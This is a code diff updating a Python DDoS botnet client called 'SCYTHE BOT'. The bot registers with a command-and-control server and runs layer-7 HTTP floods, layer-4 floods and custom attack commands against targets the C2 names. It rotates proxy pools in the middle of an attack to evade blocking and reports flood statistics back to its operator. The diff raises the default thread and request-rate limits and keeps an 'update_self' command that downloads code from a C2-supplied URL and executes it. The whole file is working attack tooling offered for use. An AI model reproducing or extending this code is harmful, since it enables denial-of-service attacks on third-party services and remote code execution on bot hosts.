@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-SCYTHE BOT v8.2 — MAXIMIZED, FIXED & SYNCED WITH C2
+SCYTHE BOT v8.3 — PROFESSIONAL, SYNCED & FULLY LOGGED
 Features:
 - Auto-create directories before logging setup
 - Hybrid Rate Limiter (works with ANY RPS)
@@ -15,10 +15,11 @@ Features:
 - SOCKS5/HTTP/SOCKS4 support
 - MID-ATTACK PROXY REFRESH
 - PROXY POOL REFRESH every 3 minutes
+- FIXED: Full real-time per-worker logging
+- FIXED: Proxy usage/dead/alive logging
 - FIXED: Better command parsing from C2
-- FIXED: Support both {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
-- FIXED: Stop specific attack by attack_id
-- FIXED: Better error handling and logging
+- FIXED: Auto-reconnect on disconnect
+- FIXED: Detailed attack report to C2
 """
 
 import socket
@@ -34,6 +35,7 @@ import signal
 import logging
 from datetime import datetime
 from logging.handlers import RotatingFileHandler
+from collections import defaultdict
 
 # ========== FIX #1: Auto-create directories BEFORE logging setup ==========
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -63,7 +65,7 @@ try:
 except:
     pass
 
-# ========== LOGGING SETUP (Rotation) ==========
+# ========== LOGGING SETUP (Rotation + Per-Worker) ==========
 LOG_FILE = os.path.join(SCRIPT_DIR, 'logs', 'bot.log')
 logging.basicConfig(
     level=logging.INFO,
@@ -124,8 +126,8 @@ config.read(os.path.join(SCRIPT_DIR, "config.ini"))
 C2_IP = config.get("C2", "IP", fallback="127.0.0.1")
 C2_PORT = config.getint("C2", "PORT", fallback=4884)
 BOT_ID = config.get("C2", "ID", fallback=socket.gethostname())
-RAW_THREADS = config.getint("C2", "THREADS", fallback=60)
-RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=800)
+RAW_THREADS = config.getint("C2", "THREADS", fallback=150)
+RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=1500)
 BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)
 
 BOT_ID = BOT_ID.strip()
@@ -152,6 +154,51 @@ reconnect_delay = 5
 max_reconnect_delay = 60
 read_buffer = ""
 
+# ========== REAL-TIME STATS TRACKER ==========
+class WorkerStats:
+    """Track real-time stats per worker."""
+    def __init__(self, worker_id):
+        self.worker_id = worker_id
+        self.requests = 0
+        self.success = 0
+        self.errors = 0
+        self.proxy_errors = 0
+        self.current_proxy = None
+        self.rps = 0
+        self.last_update = time.time()
+        self._lock = threading.Lock()
+
+    def add_request(self, success=False, proxy_error=False):
+        with self._lock:
+            self.requests += 1
+            if success:
+                self.success += 1
+            else:
+                self.errors += 1
+            if proxy_error:
+                self.proxy_errors += 1
+
+    def update_rps(self):
+        with self._lock:
+            now = time.time()
+            elapsed = now - self.last_update
+            if elapsed >= 1.0:
+                self.rps = int(self.requests / elapsed)
+                self.requests = 0
+                self.last_update = now
+
+    def get_stats(self):
+        with self._lock:
+            return {
+                "worker_id": self.worker_id,
+                "requests": self.requests,
+                "success": self.success,
+                "errors": self.errors,
+                "proxy_errors": self.proxy_errors,
+                "current_proxy": self.current_proxy,
+                "rps": self.rps,
+            }
+
 # ========== PROXY MANAGEMENT ==========
 class ProxyPool:
     """Smart proxy pool with rotation, health tracking, dead-proxy skipping."""
@@ -163,6 +210,7 @@ class ProxyPool:
         self._lock = threading.Lock()
         self._index = 0
         self._refresh_count = 0
+        self._total_used = 0
 
     @property
     def count(self):
@@ -174,17 +222,24 @@ class ProxyPool:
         with self._lock:
             return len(self._all_proxies)
 
+    @property
+    def dead_count(self):
+        with self._lock:
+            return len(self._dead)
+
     def refresh(self, new_proxies):
         """Refresh proxy pool dengan proxy baru dari C2 (mid-attack)."""
         with self._lock:
             old_count = len(self._alive)
+            added = 0
             for p in new_proxies:
                 if p not in self._all_proxies and p not in self._dead:
                     self._all_proxies.append(p)
                     self._alive.append(p)
+                    added += 1
             self._refresh_count += 1
             new_count = len(self._alive)
-            logger.info(f"[PROXY] Pool refreshed: {old_count} → {new_count} alive (refresh #{self._refresh_count})")
+            logger.info(f"[PROXY] Pool refreshed: {old_count} → {new_count} alive (+{added} new, refresh #{self._refresh_count})")
 
     def get_next(self):
         """Round-robin with auto-skip dead proxies."""
@@ -193,6 +248,7 @@ class ProxyPool:
                 return None
             proxy = self._alive[self._index % len(self._alive)]
             self._index += 1
+            self._total_used += 1
             return proxy
 
     def mark_dead(self, proxy_url, max_failures=5):
@@ -206,12 +262,22 @@ class ProxyPool:
                 if proxy_url in self._alive:
                     self._alive.remove(proxy_url)
                     self._dead.add(proxy_url)
-                    logger.warning(f"[PROXY] {proxy_url} marked DEAD (failures: {self._fail_counts[proxy_url]})")
+                    logger.warning(f"[PROXY] {proxy_url} marked DEAD (failures: {self._fail_counts[proxy_url]}, alive: {len(self._alive)}, dead: {len(self._dead)})")
 
     def mark_alive(self, proxy_url):
         """Reset failure count on success."""
         with self._lock:
             self._fail_counts[proxy_url] = 0
+
+    def get_stats(self):
+        with self._lock:
+            return {
+                "alive": len(self._alive),
+                "dead": len(self._dead),
+                "total": len(self._all_proxies),
+                "total_used": self._total_used,
+                "refresh_count": self._refresh_count,
+            }
 
 def format_proxy(proxy_url):
     """Format proxy URL untuk requests library."""
@@ -243,14 +309,14 @@ def connect_to_c2():
             except:
                 pass
             s.connect((C2_IP, C2_PORT))
-            log("Connected to C2!")
+            log("✅ Connected to C2!")
             s.sendall(json.dumps({"type": "register", "id": BOT_ID, "threads": THREADS, "rps_limit": RPS_LIMIT}).encode('utf-8') + b"\n")
             s.sendall(json.dumps({"type": "heartbeat", "id": BOT_ID, "time": int(time.time())}).encode('utf-8') + b"\n")
-            log("Initial register + heartbeat sent")
+            log("📤 Initial register + heartbeat sent")
             reconnect_delay = 5
             return s
         except Exception as e:
-            log(f"Connection failed: {e}. Retry in {reconnect_delay}s...", logging.WARNING)
+            log(f"❌ Connection failed: {e}. Retry in {reconnect_delay}s...", logging.WARNING)
             time.sleep(reconnect_delay + random.uniform(0, 2))
             if reconnect_delay < max_reconnect_delay:
                 reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
@@ -262,7 +328,7 @@ def send_report(sock, report):
         sock.sendall(data)
         return True
     except Exception as e:
-        log(f"Send report error: {e}", logging.WARNING)
+        log(f"📤 Send report error: {e}", logging.WARNING)
         return False
 
 # ========== HYBRID RATE LIMITER ==========
@@ -291,7 +357,7 @@ class HybridRateLimiter:
             sleep_time = (1.0 - self.tokens) / self.rate
             return sleep_time
 
-# ========== ATTACK ENGINE v8.2 (MAXIMIZED & FIXED) ==========
+# ========== ATTACK ENGINE v8.3 (PROFESSIONAL & FULLY LOGGED) ==========
 class AttackEngine(threading.Thread):
     def __init__(self, attack_id, method, target, port, duration, hold_time, extra, rps_limit, proxies, sock):
         super().__init__(daemon=True)
@@ -318,6 +384,7 @@ class AttackEngine(threading.Thread):
         self._last_reported_total = 0
         self._net_io_start = None
         self.proxy_pool = None
+        self.worker_stats = {}  # worker_id -> WorkerStats
 
     @property
     def total_requests(self):
@@ -358,14 +425,14 @@ class AttackEngine(threading.Thread):
     def update_rps(self, new_rps_limit):
         self.rps_limit = new_rps_limit
         self.rps_update_event.set()
-        log(f"[ENGINE] RPS updated to {new_rps_limit} for attack {self.attack_id}")
+        log(f"[ENGINE] 🔄 RPS updated to {new_rps_limit} for attack {self.attack_id}")
 
     def update_proxies(self, new_proxies):
         """Update proxy pool mid-attack (dari C2)."""
         if self.proxy_pool and new_proxies:
             self.proxy_pool.refresh(new_proxies)
             self._proxy_refresh_count += 1
-            log(f"[ENGINE] Proxy pool refreshed mid-attack (#{self._proxy_refresh_count})")
+            log(f"[ENGINE] 🔄 Proxy pool refreshed mid-attack (#{self._proxy_refresh_count})")
 
     def run(self):
         self.start_time = time.time()
@@ -375,7 +442,18 @@ class AttackEngine(threading.Thread):
 
         self.proxy_pool = ProxyPool(self.proxies)
 
-        log(f"[ENGINE] Attack {self.attack_id} started | Method: {self.method} | Target: {self.target} | Threads: {THREADS} | RPS/Bot: {self.rps_limit} | Proxies: {self.proxy_pool.total} | Duration: {self.duration}s | 12H STABLE MODE")
+        log(f"[ENGINE] 🚀 Attack {self.attack_id} started | Method: {self.method} | Target: {self.target} | Threads: {THREADS} | RPS/Bot: {self.rps_limit} | Proxies: {self.proxy_pool.total} (alive: {self.proxy_pool.count}) | Duration: {self.duration}s | Hold: {self.hold_time}s")
+
+        # Send attack_started report to C2
+        send_report(self.sock, {
+            "type": "attack_started",
+            "id": BOT_ID,
+            "attack_id": self.attack_id,
+            "proxies_count": self.proxy_pool.total,
+            "proxies_alive": self.proxy_pool.count,
+            "threads": THREADS,
+            "rps_limit": self.rps_limit,
+        })
 
         progress_thread = threading.Thread(target=self._progress_reporter, daemon=True)
         progress_thread.start()
@@ -394,9 +472,9 @@ class AttackEngine(threading.Thread):
             elif self.method == "CUSTOM":
                 self._run_external(self.extra)
             else:
-                log(f"[ENGINE] Unknown method: {self.method}")
+                log(f"[ENGINE] ❌ Unknown method: {self.method}")
         except Exception as e:
-            log(f"[ENGINE] CRITICAL ERROR: {e}", logging.ERROR)
+            log(f"[ENGINE] 💥 CRITICAL ERROR: {e}", logging.ERROR)
             import traceback
             log(f"[ENGINE] Traceback: {traceback.format_exc()}", logging.ERROR)
 
@@ -405,9 +483,10 @@ class AttackEngine(threading.Thread):
         elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
         final_rps = self.total_requests // elapsed
 
-        log(f"[ENGINE] Attack {self.attack_id} finished | Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Refreshes: {self._proxy_refresh_count} | Avg RPS: {final_rps}")
+        log(f"[ENGINE] ✅ Attack {self.attack_id} finished | Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Refreshes: {self._proxy_refresh_count} | Avg RPS: {final_rps}")
 
     def _progress_reporter(self):
+        """Report progress tiap 5 detik ke C2 + log real-time."""
         while not self.stop_flag.is_set():
             time.sleep(5)
             if self.stop_flag.is_set():
@@ -419,6 +498,13 @@ class AttackEngine(threading.Thread):
 
             elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
             current_rps = delta // 5 if delta > 0 else 0
+
+            # Log per-worker stats
+            worker_logs = []
+            for wid, stats in self.worker_stats.items():
+                stats.update_rps()
+                s = stats.get_stats()
+                worker_logs.append(f"W{wid}:{s['rps']}rps/{s['success']}ok/{s['errors']}err")
 
             bw_sent_mb = 0
             bw_recv_mb = 0
@@ -433,6 +519,8 @@ class AttackEngine(threading.Thread):
                 mem = psutil.virtual_memory()
                 mem_percent = mem.percent
 
+            proxy_stats = self.proxy_pool.get_stats() if self.proxy_pool else {}
+
             report = {
                 "type": "attack_progress",
                 "id": BOT_ID,
@@ -444,14 +532,18 @@ class AttackEngine(threading.Thread):
                 "proxy_requests": self.proxy_requests,
                 "direct_requests": self.direct_requests,
                 "proxy_refresh_count": self._proxy_refresh_count,
-                "proxy_pool_alive": self.proxy_pool.count if self.proxy_pool else 0,
+                "proxy_pool_alive": proxy_stats.get("alive", 0),
+                "proxy_pool_dead": proxy_stats.get("dead", 0),
                 "bandwidth_sent_mb": round(bw_sent_mb, 2),
                 "bandwidth_recv_mb": round(bw_recv_mb, 2),
                 "cpu_percent": cpu_percent,
                 "mem_percent": mem_percent,
+                "worker_stats": worker_logs,
             }
             send_report(self.sock, report)
-            log(f"[PROGRESS] Delta: +{delta} | Total: {current_total} | RPS: {current_rps} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Pool: {self.proxy_pool.count if self.proxy_pool else 0} | Refreshes: {self._proxy_refresh_count} | BW: {bw_sent_mb:.1f}MB/{bw_recv_mb:.1f}MB | CPU: {cpu_percent}%")
+
+            # REAL-TIME LOG
+            log(f"[PROGRESS] ⏱️ +{delta}req | Total:{current_total} | RPS:{current_rps} | Success:{self.success_requests} | Proxy:{self.proxy_requests} | Pool:{proxy_stats.get('alive',0)}a/{proxy_stats.get('dead',0)}d | Workers: {' | '.join(worker_logs)} | BW:{bw_sent_mb:.1f}MB↑/{bw_recv_mb:.1f}MB↓ | CPU:{cpu_percent}%")
 
     def _run_layer7(self, end_time):
         self.thread_count = THREADS
@@ -463,19 +555,21 @@ class AttackEngine(threading.Thread):
                 return
 
         rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
-        log(f"[ENGINE] Starting {self.thread_count} L7 workers | Rate: {rps_per_thread:.3f} RPS/thread | Total target: {self.rps_limit} RPS | PROXY-FIRST | 12H STABLE")
+        log(f"[ENGINE] 🚀 Starting {self.thread_count} L7 workers | Rate: {rps_per_thread:.3f} RPS/thread | Total target: {self.rps_limit} RPS | PROXY-FIRST | 12H STABLE")
 
         threads = []
         for i in range(self.thread_count):
             limiter = HybridRateLimiter(rps_per_thread)
-            t = threading.Thread(target=self._l7_worker, args=(end_time, i, limiter), daemon=True)
+            stats = WorkerStats(i)
+            self.worker_stats[i] = stats
+            t = threading.Thread(target=self._l7_worker, args=(end_time, i, limiter, stats), daemon=True)
             t.start()
             threads.append(t)
 
         for t in threads:
             t.join(timeout=max(0, end_time - time.time()))
 
-    def _l7_worker(self, end_time, worker_id, limiter):
+    def _l7_worker(self, end_time, worker_id, limiter, stats):
         session = requests.Session()
         adapter = HTTPAdapter(pool_connections=1, pool_maxsize=5, max_retries=0)
         session.mount('http://', adapter)
@@ -521,13 +615,15 @@ class AttackEngine(threading.Thread):
             log(f"[W{worker_id}] ❌ No proxies available. Worker idle.")
             return
 
+        log(f"[W{worker_id}] 🚀 Worker started | Target: {self.target} | RPS limit: {self.rps_limit}")
+
         while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
             if self.rps_update_event.is_set():
                 self.rps_update_event.clear()
                 new_rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
                 limiter.rate = float(new_rps_per_thread)
                 limiter.interval = 1.0 / limiter.rate if limiter.rate > 0 else 0
-                log(f"[W{worker_id}] RPS limit updated to {self.rps_limit} ({new_rps_per_thread:.3f}/thread)")
+                log(f"[W{worker_id}] 🔄 RPS limit updated to {self.rps_limit} ({new_rps_per_thread:.3f}/thread)")
 
             result = limiter.acquire()
             if result is not True:
@@ -536,14 +632,17 @@ class AttackEngine(threading.Thread):
                     time.sleep(sleep_time)
                 continue
 
+            # Get next proxy
             if current_proxy is None or consecutive_proxy_fails >= 3:
                 current_proxy = self.proxy_pool.get_next()
                 if current_proxy:
                     current_proxy_formatted = format_proxy(current_proxy)
                     consecutive_proxy_fails = 0
                     proxy_failures = 0
+                    stats.current_proxy = current_proxy
+                    log(f"[W{worker_id}] 🔄 Switched to proxy: {current_proxy[:50]}...")
                 else:
-                    log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 2s...")
+                    log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 2s... | Pool: {self.proxy_pool.count}a/{self.proxy_pool.dead_count}d")
                     time.sleep(2)
                     continue
 
@@ -560,6 +659,7 @@ class AttackEngine(threading.Thread):
 
                 self._inc_total()
                 self._inc_proxy()
+                stats.add_request(success=True)
 
                 if resp.status_code < 400:
                     self._inc_success()
@@ -567,44 +667,60 @@ class AttackEngine(threading.Thread):
                     consecutive_proxy_fails = 0
                 else:
                     consecutive_proxy_fails += 1
+                    stats.add_request(success=False)
 
                 req_count += 1
+
+                # Log every 100 requests
+                if req_count % 100 == 0:
+                    log(f"[W{worker_id}] 📊 {req_count} reqs | Success: {stats.success} | Errors: {stats.errors} | Proxy: {current_proxy[:40]}...")
 
             except requests.exceptions.ProxyError as e:
                 err_count += 1
                 proxy_failures += 1
                 consecutive_proxy_fails += 1
+                stats.add_request(proxy_error=True)
                 self.proxy_pool.mark_dead(current_proxy, max_failures=5)
+                log(f"[W{worker_id}] ❌ ProxyError: {current_proxy[:40]}... | Failures: {proxy_failures}")
                 current_proxy = None
                 current_proxy_formatted = None
+                stats.current_proxy = None
 
             except requests.exceptions.Timeout:
                 self._inc_total()
                 err_count += 1
                 consecutive_proxy_fails += 1
+                stats.add_request(success=False)
                 if consecutive_proxy_fails >= 5:
                     self.proxy_pool.mark_dead(current_proxy, max_failures=8)
+                    log(f"[W{worker_id}] ⚠️ Proxy timeout 5x: {current_proxy[:40]}... marked dead")
                     current_proxy = None
                     current_proxy_formatted = None
+                    stats.current_proxy = None
 
             except requests.exceptions.ConnectionError as e:
                 self._inc_total()
                 err_count += 1
                 consecutive_proxy_fails += 1
+                stats.add_request(proxy_error=True)
                 self.proxy_pool.mark_dead(current_proxy, max_failures=5)
+                log(f"[W{worker_id}] ❌ ConnectionError: {current_proxy[:40]}... | Failures: {consecutive_proxy_fails}")
                 current_proxy = None
                 current_proxy_formatted = None
+                stats.current_proxy = None
 
             except Exception as e:
                 err_count += 1
                 consecutive_proxy_fails += 1
+                stats.add_request(success=False)
                 if err_count <= 3:
-                    log(f"[W{worker_id}] Error: {e}")
+                    log(f"[W{worker_id}] ⚠️ Error: {e}")
                 if consecutive_proxy_fails >= 3:
                     current_proxy = None
                     current_proxy_formatted = None
+                    stats.current_proxy = None
 
-        log(f"[W{worker_id}] Finished | Requests: {req_count} | Errors: {err_count} | Proxy: {self.proxy_requests}")
+        log(f"[W{worker_id}] ✅ Finished | Requests: {req_count} | Success: {stats.success} | Errors: {stats.errors} | ProxyErrors: {stats.proxy_errors}")
 
     def _run_layer4(self, end_time):
         try:
@@ -637,25 +753,31 @@ class AttackEngine(threading.Thread):
     def stop(self):
         self.stop_flag.set()
 
-# ========== PARSER PERINTAH DARI C2 (FIXED) ==========
+# ========== PARSER PERINTAH DARI C2 (FIXED & PROFESSIONAL) ==========
 def handle_command(sock, cmd_json):
     global proxy_list
     try:
         data = json.loads(cmd_json)
         
-        # FIXED: Support both formats: {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
+        # FIXED: Support multiple command formats
+        # Format 1: {"type": "command", "cmd": "attack", ...}
+        # Format 2: {"cmd": "attack", ...}
+        # Format 3: {"type": "attack", ...} (legacy)
         cmd = data.get("cmd", "").lower()
         msg_type = data.get("type", "").lower()
         
         # Debug: log semua command yang diterima
-        log(f"📩 RAW COMMAND: type={msg_type}, cmd={cmd}, keys={list(data.keys())}")
+        log(f"📩 RAW COMMAND RECEIVED: type={msg_type}, cmd={cmd}, keys={list(data.keys())}, raw={cmd_json[:200]}")
         
-        if not cmd and msg_type:
-            # Kalau gak ada cmd tapi ada type, coba pakai type sebagai cmd
+        # Infer command dari type kalau cmd gak ada
+        if not cmd and msg_type in ["command", "attack", "stop", "proxy_refresh", "update_rps", "proxy_update", "update_self", "exit", "ping"]:
             cmd = msg_type
+            if msg_type == "command" and "cmd" in data:
+                cmd = data["cmd"].lower()
 
         if cmd == "ping":
             send_report(sock, {"type": "pong", "id": BOT_ID, "time": time.time()})
+            log("📤 Sent pong to C2")
 
         elif cmd == "attack":
             attack_id = data.get("attack_id", str(time.time()))
@@ -672,16 +794,25 @@ def handle_command(sock, cmd_json):
             attack_proxies = data.get("proxies", [])
             if attack_proxies:
                 proxy_list = attack_proxies
-                log(f"[ATTACK] Received {len(attack_proxies)} proxies from C2")
+                log(f"[ATTACK] 📦 Received {len(attack_proxies)} proxies from C2")
 
             active_proxies = attack_proxies if attack_proxies else proxy_list
 
             if not active_proxies:
-                log(f"⚠️ [ATTACK] No proxies available! Attack will proceed with available pool only.")
+                log(f"⚠️ [ATTACK] No proxies available! Attack will proceed with direct connection only.")
             else:
                 log(f"✅ [ATTACK] Using {len(active_proxies)} proxies for attack")
 
-            send_report(sock, {"type": "attack_started", "id": BOT_ID, "attack_id": attack_id, "proxies_count": len(active_proxies)})
+            # Send attack_started report
+            send_report(sock, {
+                "type": "attack_started", 
+                "id": BOT_ID, 
+                "attack_id": attack_id, 
+                "proxies_count": len(active_proxies),
+                "method": method,
+                "target": target,
+            })
+            log(f"[ATTACK] 🚀 LAUNCHING ATTACK: {attack_id} | Method: {method} | Target: {target} | Port: {port} | Duration: {duration}s | Hold: {hold_time}s | RPS: {rps_limit} | Proxies: {len(active_proxies)}")
 
             engine = AttackEngine(
                 attack_id=attack_id,
@@ -697,16 +828,27 @@ def handle_command(sock, cmd_json):
             )
             current_attacks[attack_id] = engine
             engine.start()
+            log(f"[ATTACK] ✅ Engine started for {attack_id}")
 
             def wait_and_report():
                 try:
-                    engine.join(timeout=duration + hold_time + 15)
+                    total_time = duration + hold_time + 15
+                    log(f"[ATTACK] ⏱️ Waiting for attack {attack_id} to complete (max {total_time}s)...")
+                    engine.join(timeout=total_time)
+                    
                     if engine.is_alive():
+                        log(f"[ATTACK] ⏱️ Attack {attack_id} still running after timeout, forcing stop...")
                         engine.stop()
                         engine.join(timeout=5)
 
                     elapsed = max(1, time.time() - engine.start_time) if engine.start_time else 1
                     rps = engine.total_requests // elapsed
+
+                    # Collect worker stats
+                    worker_summary = []
+                    for wid, stats in engine.worker_stats.items():
+                        s = stats.get_stats()
+                        worker_summary.append(f"W{wid}:{s['success']}ok/{s['errors']}err/{s['proxy_errors']}pxerr")
 
                     report = {
                         "type": "attack_result",
@@ -724,12 +866,14 @@ def handle_command(sock, cmd_json):
                         "direct_requests": engine.direct_requests,
                         "proxy_refresh_count": engine._proxy_refresh_count,
                         "rps": rps,
-                        "output": f"Total: {engine.total_requests} | Success: {engine.success_requests} | Proxy: {engine.proxy_requests} | Direct: {engine.direct_requests} | Refreshes: {engine._proxy_refresh_count} | RPS: {rps}"
+                        "worker_summary": worker_summary,
+                        "output": f"Total: {engine.total_requests} | Success: {engine.success_requests} | Proxy: {engine.proxy_requests} | Direct: {engine.direct_requests} | Refreshes: {engine._proxy_refresh_count} | RPS: {rps} | Workers: {' | '.join(worker_summary)}"
                     }
                     send_report(sock, report)
+                    log(f"[ATTACK] ✅ RESULT for {attack_id}: {report['output']}")
                     current_attacks.pop(attack_id, None)
                 except Exception as e:
-                    log(f"[ENGINE] wait_and_report error: {e}", logging.ERROR)
+                    log(f"[ENGINE] 💥 wait_and_report error: {e}", logging.ERROR)
                     import traceback
                     log(f"[ENGINE] Traceback: {traceback.format_exc()}", logging.ERROR)
 
@@ -742,6 +886,7 @@ def handle_command(sock, cmd_json):
                 engine = current_attacks[attack_id]
                 engine.update_proxies(new_proxies)
                 send_report(sock, {"type": "proxy_refreshed", "id": BOT_ID, "attack_id": attack_id, "new_count": len(new_proxies)})
+                log(f"[PROXY] 🔄 Refreshed {len(new_proxies)} proxies for attack {attack_id}")
             else:
                 log(f"⚠️ Cannot refresh proxies: attack {attack_id} not found or no proxies")
 
@@ -752,6 +897,7 @@ def handle_command(sock, cmd_json):
                 engine = current_attacks[attack_id]
                 engine.update_rps(new_rps)
                 send_report(sock, {"type": "rps_updated", "id": BOT_ID, "attack_id": attack_id, "new_rps": new_rps})
+                log(f"[RPS] 🔄 Updated RPS for {attack_id} to {new_rps}")
             else:
                 log(f"⚠️ Cannot update RPS: attack {attack_id} not found or invalid RPS {new_rps}")
 
@@ -765,24 +911,27 @@ def handle_command(sock, cmd_json):
                 engine.join(timeout=5)
                 current_attacks.pop(attack_id, None)
                 send_report(sock, {"type": "attack_stopped", "id": BOT_ID, "attack_id": attack_id})
+                log(f"✅ Attack {attack_id} stopped")
             else:
-                # Stop all attacks (legacy behavior)
-                log("🛑 Stop all attacks command received")
+                # Stop all attacks
+                log("🛑 Stop ALL attacks command received")
                 stop_event.set()
                 for aid, engine in list(current_attacks.items()):
                     try:
+                        log(f"🛑 Stopping attack {aid}...")
                         engine.stop()
                         engine.join(timeout=3)
-                    except:
-                        pass
+                    except Exception as e:
+                        log(f"Error stopping {aid}: {e}")
                 current_attacks.clear()
                 stop_event.clear()
                 send_report(sock, {"type": "all_stopped", "id": BOT_ID})
+                log("✅ All attacks stopped")
 
         elif cmd == "proxy_update":
             new_proxies = data.get("proxies", [])
             proxy_list = new_proxies
-            log(f"Received {len(proxy_list)} proxies from C2")
+            log(f"📦 Received {len(proxy_list)} proxies from C2")
             send_report(sock, {"type": "proxy_updated", "id": BOT_ID, "count": len(proxy_list)})
 
         elif cmd == "update_self":
@@ -792,33 +941,38 @@ def handle_command(sock, cmd_json):
                     r = requests.get(url)
                     with open(__file__, "wb") as f:
                         f.write(r.content)
-                    log("Self-updated, restarting...")
+                    log("🔄 Self-updated, restarting...")
                     os.execv(sys.executable, [sys.executable] + sys.argv)
                 except Exception as e:
                     send_report(sock, {"type": "update_failed", "error": str(e)})
+                    log(f"❌ Self-update failed: {e}")
 
         elif cmd == "exit":
-            log("Exit command received. Goodbye!")
+            log("👋 Exit command received. Goodbye!")
             sock.close()
             sys.exit(0)
         else:
-            log(f"Unknown command: {cmd} | Data: {data}")
+            log(f"❓ Unknown command: '{cmd}' | type: '{msg_type}' | Data: {data}")
 
     except json.JSONDecodeError as e:
-        log(f"Invalid JSON: {cmd_json[:200]} - {e}", logging.WARNING)
+        log(f"❌ Invalid JSON: {cmd_json[:200]}... - {e}", logging.WARNING)
     except Exception as e:
-        log(f"Error handling command: {e}", logging.ERROR)
+        log(f"💥 Error handling command: {e}", logging.ERROR)
         import traceback
         log(f"Traceback: {traceback.format_exc()}", logging.ERROR)
 
-# ========== MAIN LOOP ==========
+# ========== MAIN LOOP (FIXED: Auto-reconnect) ==========
 def main():
     global read_buffer
-    log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | 12H STABLE | Connecting to C2...")
+    log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | 12H STABLE | C2: {C2_IP}:{C2_PORT}")
+    
     while not _shutdown_event.is_set():
         sock = connect_to_c2()
         if not sock:
-            break
+            log("❌ Failed to connect to C2, retrying...")
+            time.sleep(5)
+            continue
+            
         read_buffer = ""
         try:
             while not _shutdown_event.is_set():
@@ -826,6 +980,7 @@ def main():
                 try:
                     chunk = sock.recv(4096).decode('utf-8', errors='ignore')
                     if not chunk:
+                        log("⚠️ Connection closed by C2")
                         break
                     read_buffer += chunk
                     while "\n" in read_buffer:
@@ -834,16 +989,27 @@ def main():
                         if line:
                             handle_command(sock, line)
                 except socket.timeout:
-                    send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
+                    # Send heartbeat
+                    hb_result = send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
+                    if not hb_result:
+                        log("⚠️ Heartbeat failed, reconnecting...")
+                        break
                     continue
                 except Exception as e:
-                    log(f"Recv error: {e}", logging.WARNING)
+                    log(f"❌ Recv error: {e}", logging.WARNING)
                     break
         except Exception as e:
-            log(f"Connection lost: {e}", logging.WARNING)
+            log(f"💥 Connection error: {e}", logging.ERROR)
+        
+        # Cleanup
+        try:
             sock.close()
-            if not _shutdown_event.is_set():
-                time.sleep(5)
+        except:
+            pass
+        
+        if not _shutdown_event.is_set():
+            log(f"🔄 Reconnecting in 5s...")
+            time.sleep(5)
 
     log("🛑 Bot shutdown complete.")
 
